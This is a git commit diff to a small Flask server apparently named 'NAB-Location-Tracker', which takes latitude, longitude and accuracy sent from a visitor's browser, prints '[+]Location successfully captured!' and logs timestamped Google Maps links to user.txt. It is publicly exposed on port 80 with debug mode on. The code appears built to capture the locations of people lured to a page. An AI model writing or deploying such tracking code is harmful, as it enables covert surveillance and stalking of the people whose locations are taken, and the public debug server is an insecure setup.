085672284d89fee6d63d144778c34b893d8cf721
1blackghost <87479500+1blackghost@users.noreply.github.com>
2022-01-31 21:47:08 -0800

    Add files via upload

--- app.py
+++ app.py
@@ -1,11 +1,14 @@
 from flask import Flask, render_template, request, jsonify,redirect,url_for
 from flask_cors import CORS, cross_origin
-
+import datetime 
+    
+done=False
 
 app = Flask(__name__)
 CORS(app, support_credentials=True)
 @app.route('/')
 def index():
+    print("[+]NAB-Location-Tracker Active")
     return render_template('index.html')
 
 
@@ -17,17 +20,26 @@ def say_name():
         data=data.split(":")
     except:
         return render_template('index.html')
-
+    
     try:
-        print(data)
-        print("https://www.google.com/maps/@"+data[0]+","+data[1])
+        print("Logging to user.txt for more reference..")
+        print("[+]Capture Details.")
+        link="https://www.google.com/maps/@"+data[0]+","+data[1]
+        print(link)
         print("Accuracy: ",data[2])
-        print('here')
+        print("[+]Location successfully captured!")
+        current_time = datetime.datetime.now() 
+        if not done:
+
+            with open('user.txt','a') as f:
+                f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link))
+
         return render_template('index.html')
         
     except:
+        print("[-]Error: I guess,Location Access Denied!")
         return render_template("index.html")
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True,host="0.0.0.0",port=80)
